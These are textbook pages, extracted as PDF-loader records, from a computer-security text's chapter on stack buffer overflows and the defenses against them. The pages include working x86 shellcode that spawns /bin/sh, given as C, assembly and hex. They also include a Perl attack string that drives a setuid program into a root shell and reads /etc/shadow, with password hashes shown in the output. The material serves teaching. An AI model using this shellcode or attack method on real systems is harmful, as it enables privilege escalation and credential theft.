library routines used by programs, including both standard libraries and third-party \\napplication libraries. Thus, for both attacker and defender, the scope of possible buffer \\noverflow locations is very large. A list of some of the most common unsafe standard \\nC Library routines is given in Table 10.2.9 These routines are all suspect and should \\nnot be used without checking the total size of data being transferred in advance, or \\nbetter still by being replaced with safer alternatives.\\nOne further note before we focus on details of the shellcode. As a consequence \\nof the various stack-based buffer overflows illustrated here, significant changes have \\nbeen made to the memory near the top of the stack. Specifically, the return address \\nand pointer to the previous stack frame have usually been destroyed. This means that \\nafter the attacker’s code has run, there is no easy way to restore the program state \\nand continue execution. This is not normally of concern for the attacker, because the \\nattacker’s usual action is to replace the existing program code with a command shell. \\nBut even if the attacker does not do this, continued normal execution of the attacked \\nprogram is very unlikely. Any attempt to do so will most likely result in the program \\ncrashing. This means that a successful buffer overflow attack results in the loss of the \\nfunction or service the attacked program provided. How significant or noticeable \\nthis is will depend very much on the attacked program and the environment it is run \\nin. If it was a client process or thread, servicing an individual request, the result may \\nbe minimal aside from perhaps some error messages in the log. However, if it was \\nan important server, its loss may well produce a noticeable effect on the system of \\n9There are other unsafe routines that may be commonly used, including a number that are OS specific. \\nMicrosoft maintains a list of unsafe Windows library calls; the list should be consulted while programming \\nfor Windows systems [HOWA07].\\nM10_STAL0611_04_GE_C10.indd   356 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 358, 'page_label': '357'}, page_content='10.1 / STACK OvERflOwS  357\\nwhich the users and administrators may become aware, hinting that there is indeed \\na problem with their system.\\nShellcode\\nAn essential component of many buffer overflow attacks is the transfer of execution \\nto code supplied by the attacker and often saved in the buffer being overflowed. This \\ncode is known as shellcode, because traditionally its function was to transfer control \\nto a user command-line interpreter, or shell, which gave access to any program avail-\\nable on the system with the privileges of the attacked program. On UNIX systems this \\nwas often achieved by compiling the code for a call to the execve (”/bin/sh”) \\nsystem function, which replaces the current program code with that of the Bourne \\nshell (or whichever other shell the attacker preferred). On Windows systems, it typi-\\ncally involved a call to the system(”command.exe”) function (or ”cmd.exe” \\non older systems) to run the DOS Command shell. Shellcode then is simply machine \\ncode, a series of binary values corresponding to the machine instructions and data \\nvalues that implement the attacker’s desired functionality. This means shellcode is \\nspecific to a particular processor architecture, and indeed usually to a specific operat-\\ning system, as it needs to be able to run on the targeted system and interact with its \\nsystem functions. This is the major reason why buffer overflow attacks are usually tar-\\ngeted at a specific piece of software running on a specific operating system. Because \\nshellcode is machine code, writing it traditionally required a good understanding of \\nthe assembly language and operation of the targeted system. Indeed, many of the \\nclassic guides to writing shellcode, including the original [LEVY96], assumed such \\nknowledge. However, more recently a number of sites and tools have been developed \\nthat automate this process (as indeed has occurred in the development of security \\nexploits generally), thus making the development of shellcode exploits available to a \\nmuch larger potential audience. One site of interest is the Metasploit Project, which \\naims to provide useful information to people who perform penetration testing, IDS \\nsignature development, and exploit research. It includes an advanced open-source \\nplatform for developing, testing, and using exploit code, which can be used to create \\nshellcode that performs any one of a variety of tasks and that exploits a range of \\nknown buffer overflow vulnerabilities.\\nshellcode developMent To highlight the basic structure of shellcode, we explore \\nthe development of a simple classic shellcode attack, which simply launches the \\nBourne shell on an Intel Linux system. The shellcode needs to implement the func-\\ntionality shown in Figure 10.8a. The shellcode marshals the necessary arguments \\nfor the execve() system function, including suitable minimal argument and envi -\\nronment lists, and then calls the function. To generate the shellcode, this high-level \\nlanguage specification must first be compiled into equivalent machine language. \\nHowever, a number of changes must then be made. First, execve(sh,args,NULL) \\nis a library function that in turn marshals the supplied arguments into the correct \\nlocations (machine registers in the case of Linux) then triggers a software interrupt \\nto invoke the kernel to perform the desired system call. For use in shellcode, these \\ninstructions are included inline, rather than relying on the library function.\\nThere are also several generic restrictions on the content of shellcode. First, it \\nhas to be position independent. That means it cannot contain any absolute address \\nM10_STAL0611_04_GE_C10.indd   357 10/11/17   3:02 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 359, 'page_label': '358'}, page_content='358  CHAPTER 10 / BuffER OvERflOw\\nint main (int argc, char *argv[])\\n{\\n    char *sh;\\n    char *args[2];\\n    sh = \"/bin/sh\";\\n    args[0] = sh;\\n    args[1] = NULL;\\n    execve (sh, args, NULL);\\n}\\nFigure 10.8 Example UNIX Shellcode\\n(a) Desired shellcode code in C\\n(b) Equivalent position-independent x86 assembly code\\n(c) Hexadecimal values for compiled x86 machine code\\n nop\\n nop                      //end of nop sled\\n          jmp find                //jump to end of code\\ncont: pop %esi                //pop address of sh off stack into %esi\\n      xor %eax, %eax          //zero contents of EAX\\n      mov %al, 0x7(%esi)      //copy zero byte to end of string sh (%esi)\\n      lea (%esi), %ebx        //load address of sh (%esi) into %ebx\\n      mov %ebx,0x8(%esi)      //save address of sh in args [0] (%esi+8)\\n      mov %eax,0xc(%esi)      //copy zero to args[1] (%esi+c)\\n      mov $0xb,%al            //copy execve syscall number (11) to AL\\n      mov %esi,%ebx           //copy address of sh (%esi) into %ebx\\n          lea 0x8(%esi),%ecx       //copy address of args (%esi+8) to %ecx\\n          lea 0xc(%esi),%edx       //copy address of args[1] (%esi+c) to %edx\\n      int $0x80               //software interrupt to execute syscall\\nfind: call cont               //call cont which saves next address on stack\\nsh:   .string \"/bin/sh\"       //string constant\\nargs: .long 0                 //space used for args array\\n      .long 0                //args[1] and also NULL for env array\\n90 90 eb 1a 5e 31 c0 88 46 07 8d 1e 89 5e 08 89\\n46 0c  b0 0b 89 f3 8d 4e 08 8d 56 0c cd 80 e8 e1\\nff ff ff 2f 62 69 6e 2f 73 68 20 20 20 20 20 20\\nreferring to itself, because the attacker generally cannot determine in advance exactly \\nwhere the targeted buffer will be located in the stack frame of the function in which \\nit is defined. These stack frames are created one below the other, working down from \\nthe top of the stack as the flow of execution in the target program has functions call-\\ning other functions. The number of frames and hence final location of the buffer will \\ndepend on the precise sequence of function calls leading to the targeted function. \\nThis function might be called from several different places in the program, and there \\nM10_STAL0611_04_GE_C10.indd   358 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 360, 'page_label': '359'}, page_content='10.1 / STACK OvERflOwS  359\\nmight be different sequences of function calls, or different amounts of temporary \\nlocal values using the stack before it is finally called. So while the attacker may have \\nan approximate idea of the location of the stack frame, it usually cannot be deter -\\nmined precisely. All of this means that the shellcode must be able to run no matter \\nwhere in memory it is located. This means only relative address references, offsets to \\nthe current instruction address, can be used. It also means the attacker is not able to \\nprecisely specify the starting address of the instructions in the shellcode.\\nAnother restriction on shellcode is that it cannot contain any NULL values. \\nThis is a consequence of how it is typically copied into the buffer in the first place. All \\nthe examples of buffer overflows we use in this chapter involve using unsafe string \\nmanipulation routines. In C, a string is always terminated with a NULL character, \\nwhich means the only place the shellcode can have a NULL is at the end, after all the \\ncode, overwritten old frame pointer, and return address values.\\nGiven the above limitations, what results from this design process is code simi-\\nlar to that shown in Figure 10.8b. This code is written in x86 assembly language, 10 \\nas used by Pentium processors. To assist in reading this code, Table 10.3 provides a \\nlist of common x86 assembly language instructions, and Table 10.4 lists some of the \\ncommon machine registers it references. 11 A lot more detail on x86 assembly lan -\\nguage and machine organization may be found in [STAL16b]. In general, the code \\nin Figure 10.8b implements the functionality specified in the original C program in \\nFigure 10.8a. However, in order to overcome the limitations mentioned above, there \\nare a few unique features.\\n10There are two conventions for writing x86 assembly language: Intel and AT&T. Among other differences, \\nthey use opposing orders for the operands. All of the examples in this chapter use the AT&T convention, \\nbecause that is what the GNU GCC compiler tools used to create these examples, accept and generate.\\n11These machine registers are all now 32 bits long. However, some can also be used as a 16-bit register \\n(being the lower half of the register) or 8-bit registers (relative to the 16-bit version) if needed.\\nMOV src, dest copy (move) value from src into dest\\nLEA src, dest copy the address (load effective address) of src into dest\\nADD / SUB src, dest add / sub value in src from dest leaving result in dest\\nAND / OR / XOR src, dest logical and / or / xor value in src with dest leaving result in dest\\nCMP val1, val2 compare val1 and val2, setting CPU flags as a result\\nJMP / JZ / JNZ addr jump / if zero / if not zero to addr\\nPUSH src push the value in src onto the stack\\nPOP dest pop the value on the top of the stack into dest\\nCALL addr call function at addr\\nLEA VE clean up stack frame before leaving function\\nRET return from function\\nINT num software interrupt to access operating system function\\nNOP no operation or do nothing instruction\\nTable 10.3 Some Common x86 Assembly Language Instructions\\nM10_STAL0611_04_GE_C10.indd   359 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 361, 'page_label': '360'}, page_content='360  CHAPTER 10 / BuffER OvERflOw\\n32 bit 16 bit\\n8 bit \\n(high)\\n8 bit \\n(low) Use\\n%eax %ax %ah %al Accumulators used for arithmetical and I/O operations and execute \\ninterrupt calls\\n%ebx %bx %bh %bl Base registers used to access memory, pass system call arguments \\nand return values\\n%ecx %cx %ch %cl Counter registers\\n%edx %dx %dh %dl Data registers used for arithmetic operations, interrupt calls and IO \\noperations\\n%ebp Base Pointer containing the address of the current stack frame\\n%eip Instruction Pointer or Program Counter containing the address of \\nthe next instruction to be executed\\n%esi Source Index register used as a pointer for string or array operations\\n%esp Stack Pointer containing the address of the top of stack\\nTable 10.4 Some x86 Registers\\nThe first feature is how the string ”/bin/sh” is referenced. As compiled by \\ndefault, this would be assumed to part of the program’s global data area. But for use \\nin shellcode, it must be included along with the instructions, typically located just after \\nthem. In order to then refer to this string, the code must determine the address where \\nit is located, relative to the current instruction address. This can be done via a novel, \\nnonstandard use of the CALL instruction. When a CALL instruction is executed, it \\npushes the address of the memory location immediately following it onto the stack. \\nThis is normally used as the return address when the called function returns. In a neat \\ntrick, the shellcode jumps to a CALL instruction at the end of the code just before the \\nconstant data (such as ”/bin/sh”) then calls back to a location just after the jump. \\nInstead of treating the address CALL pushed onto the stack as a return address, it \\npops it off the stack into the %esi register to use as the address of the constant data. \\nThis technique will succeed no matter where in memory the code is located. Space for \\nthe other local variables used by the shellcode is placed following the constant string, \\nand also referenced using offsets from this same dynamically determined address.\\nThe next issue is ensuring that no NULLs occur in the shellcode. This means \\na zero value cannot be used in any instruction argument or in any constant data \\n(such as the terminating NULL on the end of the ”/bin/sh” string). Instead, any \\nrequired zero values must be generated and saved as the code runs. The logical XOR \\ninstruction of a register value with itself generates a zero value, as is done here with \\nthe %eax register. This value can then be copied anywhere needed, such as the end \\nof the string, and also as the value of args[1].\\nTo deal with the inability to precisely determine the starting address of this \\ncode, the attacker can exploit the fact that the code is often much smaller than the \\nspace available in the buffer (just 40 bytes long in this example). By the placing the \\ncode near the end of the buffer, the attacker can pad the space before it with NOP \\ninstructions. Because these instructions do nothing, the attacker can specify the return \\naddress used to enter this code as a location somewhere in this run of NOPs, which \\nM10_STAL0611_04_GE_C10.indd   360 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 362, 'page_label': '361'}, page_content='10.1 / STACK OvERflOwS  361\\nis called a NOP sled. If the specified address is approximately in the middle of the \\nNOP sled, the attacker’s guess can differ from the actual buffer address by half the \\nsize of the NOP sled, and the attack will still succeed. No matter where in the NOP \\nsled the actual target address is, the computer will run through the remaining NOPs, \\ndoing nothing, until it reaches the start of the real shellcode.\\nWith this background, you should now be able to trace through the resulting \\nassembler shellcode listed in Figure 10.8b. In brief, this code:\\n• Determines the address of the constant string using the JMP/CALL trick.\\n• Zeroes the contents of %eax and copies this v alue to the end of the constant \\nstring.\\n• Saves the address of that string in args[0].\\n• Zeroes the value of args[1].\\n• Marshals the arguments for the system call being:\\n — The code number for the execve system call (11).\\n — The address of the string as the name of the program to load.\\n — The address of the args array as its argument list.\\n — The address of args[1], because it is NULL, as the (empty) environment list.\\n• Generates a software interrupt to execute this system call (which never returns).\\nWhen this code is assembled, the resulting machine code is shown in hexadecimal in \\nFigure 10.8c. This includes a couple of NOP instructions at the front (which can be \\nmade as long as needed for the NOP sled), and ASCII spaces instead of zero values \\nfor the local variables at the end (because NULLs cannot be used, and because the \\ncode will write the required values in when it runs). This shellcode forms the core of \\nthe attack string, which must now be adapted for some specific vulnerable program.\\nexaMple oF a stack overFlow attack We now have all of the components \\nneeded to understand a stack overflow attack. To illustrate how such an attack is actu-\\nally executed, we use a target program that is a variant on that shown in Figure\\xa010.5a. \\nThe modified program has its buffer size increased to 64 (to provide enough room \\nfor our shellcode), has unbuffered input (so no values are lost when the Bourne shell \\nis launched), and has been made setuid root. This means when it is run, the program \\nexecutes with superuser/administrator privileges, with complete access to the system. \\nThis simulates an attack where an intruder has gained access to some system as a \\nnormal user and wishes to exploit a buffer overflow in a trusted utility to gain greater \\nprivileges.\\nHaving identified a suitable, vulnerable, trusted utility program, the attacker \\nhas to analyze it to determine the likely location of the targeted buffer on the stack \\nand how much data are needed to reach up to and overflow the old frame pointer \\nand return address in its stack frame. To do this, the attacker typically runs the target \\nprogram using a debugger on the same type of system as is being targeted. Either by \\ncrashing the program with too much random input then using the debugger on the \\ncore dump, or by just running the program under debugger control with a breakpoint \\nin the targeted function, the attacker determines a typical location of the stack frame \\nM10_STAL0611_04_GE_C10.indd   361 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 363, 'page_label': '362'}, page_content='362  CHAPTER 10 / BuffER OvERflOw\\nfor this function. When this was done with our demonstration program, the buffer \\ninp was found to start at address 0xbffffbb0, the current frame pointer (in %ebp) \\nwas 0xbffffc08, and the saved frame pointer at that address was 0xbffffc38. \\nThis means that 0x58 or 88 bytes are needed to fill the buffer and reach the saved \\nframe pointer. Allowing first a few more spaces at the end to provide room for the \\nargs array, the NOP sled at the start is extended until a total of exactly 88 bytes \\nare used. The new frame pointer value can be left as 0xbffffc38, and the target \\nreturn address value can be set to 0xbffffbc0, which places it around the middle \\nof the NOP sled. Next, there must be a newline character to end this (overlong) input \\nline, which gets() will read. This gives a total of 97 bytes. Once again a small Perl \\nprogram is used to convert the hexadecimal representation of this attack string into \\nbinary to implement the attack.\\nThe attacker must also specify the commands to be run by the shell once the \\nattack succeeds. These also must be written to the target program, as the spawned \\nBourne shell will be reading from the same standard input as the program it replaces. \\nIn this example, we will run two UNIX commands:\\n1. whoami displays the identity of the user whose privileges are currently being \\nused.\\n2. cat/etc/shadow displays the contents of the shadow password file, holding \\nthe user’s encrypted passwords, which only the superuser has access to.\\nFigure 10.9 shows this attack being executed. First, a directory listing of the target \\nprogram buffer4 shows that it is indeed owned by the root user and is a setuid pro -\\ngram. Then when the target commands are run directly, the current user is identified \\nas knoppix, which does not have sufficient privilege to access the shadow password \\nfile. Next, the contents of the attack script are shown. It contains the Perl program \\nfirst to encode and output the shellcode and then output the desired shell com -\\nmands. Lastly, you see the result of piping this output into the target program. The \\ninput line read displays as garbage characters (truncated in this listing, though note \\nthe string /bin/sh is included in it). Then, the output from the whoami command \\nshows the shell is indeed executing with root privileges. This means the contents \\nof the shadow password file can be read, as shown (also truncated). The encrypted \\npasswords for users root and knoppix may be seen, and these could be given to a \\npassword-cracking program to attempt to determine their values. Our attack has \\nsuccessfully acquired superuser privileges on the target system and could be used to \\nrun any desired command.\\nThis example simulates the exploit of a local vulnerability on a system, enabling \\nthe attacker to escalate his or her privileges. In practice, the buffer is likely to be \\nlarger (1024 being a common size), which means the NOP sled would be correspond-\\ningly larger, and consequently the guessed target address need not be as accurately \\ndetermined. In addition, in practice a targeted utility will likely use buffered rather \\nthan unbuffered input. This means that the input library reads ahead by some amount \\nbeyond what the program has requested. However, when the execve(”/bin/sh”) \\nfunction is called, this buffered input is discarded. Thus the attacker needs to pad \\nthe input sent to the program with sufficient lines of blanks (typically about 1000+ \\ncharacters worth) so the desired shell commands are not included in this discarded \\nM10_STAL0611_04_GE_C10.indd   362 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 364, 'page_label': '363'}, page_content='10.1 / STACK OvERflOwS  363\\nbuffer content. This is easily done (just a dozen or so more print statements in the \\nPerl program), but it would have made this example bulkier and less clear.\\nThe targeted program need not be a trusted system utility. Another possible \\ntarget is a program providing a network service; that is, a network daemon. A com-\\nmon approach for such programs is listening for connection requests from clients \\nthen spawning a child process to handle that request. The child process typically has \\nthe network connection mapped to its standard input and output. This means the \\nchild program’s code may use the same type of unsafe input or buffer copy code as  \\nwe have seen already. This was indeed the case with the stack overflow attack used \\nby the Morris Worm back in 1988. It targeted the use of gets() in the fingerd \\ndaemon handling requests for the UNIX finger network service (which provided \\ninformation on the users on the system).\\nYet another possible target is a program, or library code, which handles com -\\nmon document formats (e.g., the library routines used to decode and display GIF \\nor JPEG images). In this case, the input is not from a terminal or network connec -\\ntion, but from the file being decoded and displayed. If such code contains a buffer \\noverflow, it can be triggered as the file contents are read, with the details encoded in \\na specially corrupted image. This attack file would be distributed via e-mail, instant \\nmessaging, or as part of a webpage. Because the attacker is not directly interacting \\nFigure 10.9 Example Stack Overflow Attack\\n$ dir -l buffer4\\n-rwsr-xr-x    1 root    knoppix           16571 Jul 17 10:49 buffer4\\n$ whoami\\nknoppix\\n$ cat /etc/shadow\\ncat: /etc/shadow: Permission denied\\n$ cat attack1\\nperl -e \\'print pack(\"H*\",\\n\"90909090909090909090909090909090\" .\\n\"90909090909090909090909090909090\" .\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\n\"ffffff2f62696e2f7368202020202020\" .\\n\"202020202020202038fcffbfc0fbffbf0a\");\\nprint \"whoami\\\\n\";\\nprint \"cat /etc/shadow\\\\\";\\'\\n$ attack1 | buffer4\\nEnter value for name: Hello your yyy)DA0Apy is e?ˆ1AFF . . . /bin/sh . . .\\nroot\\nroot:$1$rNLId4rX$nka7JlxH7.4UJT4l9JRLk1:13346:0:99999:7:::\\ndaemon:*:11453:0:99999:7:::\\n. . .\\nnobody:*:11453:0:99999:7:::\\nknoppix:$1$FvZSBKBu$EdSFvuuJdKaCH8Y0IdnAv/:13346:0:99999:7:::\\n. . .\\nM10_STAL0611_04_GE_C10.indd   363 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 365, 'page_label': '364'}, page_content='364  CHAPTER 10 / BuffER OvERflOw\\nwith the targeted program and system, the shellcode would typically open a network \\nconnection back to a system under the attacker’s control, to return information and \\npossibly receive additional commands to execute. All of this shows that buffer over-\\nflows can be found in a wide variety of programs, processing a range of different input, \\nand with a variety of possible responses.\\nThe preceding descriptions illustrate how simple shellcode can be developed \\nand deployed in a stack overflow attack. Apart from just spawning a command-line \\n(UNIX or DOS) shell, the attacker might want to create shellcode to perform some-\\nwhat more complex operations, as indicated in the case just discussed. The Metasploit \\nProject site includes a range of functionality in the shellcode it can generate, and the \\nPacket Storm website includes a large collection of packaged shellcode, including \\ncode that can:\\n• Set up a listening service to launch a remote shell when connected to\\n• Create a reverse shell that connects back to the hacker\\n• Use local exploits that establish a shell or execve a process\\n• Flush firewall rules (such as IPTables and IPChains) that currently block other \\nattacks\\n• Break out of a chrooted (restricted execution) environment, giving full access \\nto the system\\nConsiderably greater detail on the process of writing shellcode for a variety of plat-\\nforms, with a range of possible results, can be found in [ANLE07].\\n 10.2 DEFENDING AGAINST BUFFER OVERFLOWS\\nWe have seen that finding and exploiting a stack buffer overflow is not that difficult. \\nThe large number of exploits over the previous few decades clearly illustrates this. \\nThere is consequently a need to defend systems against such attacks by either pre -\\nventing them, or at least detecting and aborting such attacks. This section discusses \\npossible approaches to implementing such protections. These can be broadly classi-\\nfied into two categories:\\n• Compile-time defenses, which aim to harden programs to resist attacks in new \\nprograms.\\n• Run-time defenses, which aim to detect and abort attacks in existing programs.\\nWhile suitable defenses have been known for a couple of decades, the very large \\nexisting base of vulnerable software and systems hinders their deployment. Hence \\nthe interest in run-time defenses, which can be deployed as operating systems and \\nupdates and can provide some protection for existing vulnerable programs. Most of \\nthese techniques are mentioned in [LHEE03].\\nCompile-Time Defenses\\nCompile-time defenses aim to prevent or detect buffer overflows by instrument -\\ning programs when they are compiled. The possibilities for doing this range from \\nM10_STAL0611_04_GE_C10.indd   364 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 366, 'page_label': '365'}, page_content='10.2 / DEfENDING AGAINST BuffER OvERflOwS  365\\nchoosing a high-level language that does not permit buffer overflows, to encouraging \\nsafe coding standards, using safe standard libraries, or including additional code to \\ndetect corruption of the stack frame.\\nchoice oF prograMMing language One possibility, as noted earlier, is to write \\nthe program using a modern high-level programming language, one that has a strong \\nnotion of variable type and what constitutes permissible operations on them. Such \\nlanguages are not vulnerable to buffer overflow attacks because their compilers \\ninclude additional code to enforce range checks automatically, removing the need \\nfor the programmer to explicitly code them. The flexibility and safety provided by \\nthese languages does come at a cost in resource use, both at compile time and also \\nin additional code that must executed at run time to impose checks such as that on \\nbuffer limits. These disadvantages are much less significant than they used to be, \\ndue to the rapid increase in processor performance. Increasingly programs are being \\nwritten in these languages and hence should be immune to buffer overflows in their \\ncode (though if they use existing system libraries or run-time execution environ -\\nments written in less safe languages, they may still be vulnerable). As we also noted, \\nthe distance from the underlying machine language and architecture also means that \\naccess to some instructions and hardware resources is lost. This limits their useful -\\nness in writing code, such as device drivers, that must interact with such resources. \\nFor these reasons, there is still likely to be at least some code written in less safe \\nlanguages such as C.\\nsaFe coding techniques If languages such as C are being used, then program -\\nmers need to be aware that their ability to manipulate pointer addresses and access \\nmemory directly comes at a cost. It has been noted that C was designed as a systems \\nprogramming language, running on systems that were vastly smaller and more con-\\nstrained than those we now use. This meant C’s designers placed much more emphasis \\non space efficiency and performance considerations than on type safety. They assumed \\nthat programmers would exercise due care in writing code using these languages and \\ntake responsibility for ensuring the safe use of all data structures and variables.\\nUnfortunately, as several decades of experience has shown, this has not been \\nthe case. This may be seen in large legacy body of potentially unsafe code in the \\nLinux, UNIX, and Windows operating systems and applications, some of which are \\npotentially vulnerable to buffer overflows.\\nIn order to harden these systems, the programmer needs to inspect the code \\nand rewrite any unsafe coding constructs in a safe manner. Given the rapid uptake of \\nbuffer overflow exploits, this process has begun in some cases. A good example is the \\nOpenBSD project, which produces a free, multiplatform 4.4BSD-based UNIX-like \\noperating system. Among other technology changes, programmers have undertaken \\nan extensive audit of the existing code base, including the operating system, standard \\nlibraries, and common utilities. This has resulted in what is widely regarded as one of \\nthe safest operating systems in widespread use. The OpenBSD project slogan in 2016 \\nclaims: “Only two remote holes in the default install, in a heck of a long time!” This \\nis a clearly enviable record. Microsoft programmers have also undertaken a major \\nproject in reviewing their code base, partly in response to continuing bad publicity \\nover the number of vulnerabilities, including many buffer overflow issues, that have \\nbeen found in their operating systems and applications code. This has clearly been a \\nM10_STAL0611_04_GE_C10.indd   365 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 367, 'page_label': '366'}, page_content='366  CHAPTER 10 / BuffER OvERflOw\\ndifficult process, though they claim that Vista and later Windows operating systems \\nbenefit greatly from this process.\\nWith regard to programmers working on code for their own programs, the dis-\\ncipline required to ensure that buffer overflows are not allowed to occur is a subset \\nof the various safe programming techniques we will discuss in Chapter 11. Specifi -\\ncally, it means a mindset that codes not only for normal successful execution, or for \\nthe expected, but is constantly aware of how things might go wrong, and coding for \\ngraceful failure, always doing something sensible when the unexpected occurs. More \\nspecifically, in the case of preventing buffer overflows, it means always ensuring \\nthat any code that writes to a buffer must first check to ensure sufficient space is \\navailable. While the preceding examples in this chapter have emphasized issues with \\nstandard library routines such as gets(), and with the input and manipulation of \\nstring data, the problem is not confined to these cases. It is quite possible to write \\nexplicit code to move values in an unsafe manner. Figure 10.10a shows an example \\nof an unsafe byte copy function. This code copies len bytes out of the from array \\ninto the to array starting at position pos and returning the end position. Unfortu -\\nnately, this function is given no information about the actual size of the destination \\nbuffer to and hence is unable to ensure an overflow does not occur. In this case, \\nthe calling code should ensure that the value of size+len is not larger than the \\nsize of the to array. This also illustrates that the input is not necessarily a string; it \\ncould just as easily be binary data, just carelessly manipulated. Figure 10.10b shows \\nan example of an unsafe byte input function. It reads the length of binary data \\nexpected and then reads that number of bytes into the destination buffer. Again the \\nproblem is that this code is not given any information about the size of the  buffer, \\nand hence is unable to check for possible overflow. These examples emphasize both \\nint copy_buf(char *to, int pos, char *from, int len)\\n{\\n    int i;\\n    for (i=0; i<len; i++) {\\n        to[pos] = from[i];\\n        pos++;\\n    }\\n    return pos;\\n}\\nFigure 10.10 Examples of Unsafe C Code\\n(a) Unsafe byte copy\\n(b) Unsafe byte input\\nshort read_chunk(FILE fil, char *to)\\n{\\n    short len;\\n    fread(&len, 2, 1, fil);        /* read length of binary data */\\n    fread(to, 1, len, fil);        /* read len bytes of binary data\\n    return len;\\n}\\nM10_STAL0611_04_GE_C10.indd   366 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 368, 'page_label': '367'}, page_content='10.2 / DEfENDING AGAINST BuffER OvERflOwS  367\\nthe need to always verify the amount of space being used and the fact that problems \\ncan occur both with plain C code, as well as from calling standard library routines. \\nA further complexity with C is caused by array and pointer notations being almost \\nequivalent, but with slightly different nuances in use. In particular, the use of pointer \\narithmetic and subsequent dereferencing can result in access beyond the allocated \\nvariable space, but in a less obvious manner. Considerable care is needed in coding \\nsuch constructs.\\nlanguage extensions and use oF saFe libraries Given the problems that can \\noccur in C with unsafe array and pointer references, there have been a number of \\nproposals to augment compilers to automatically insert range checks on such refer -\\nences. While this is fairly 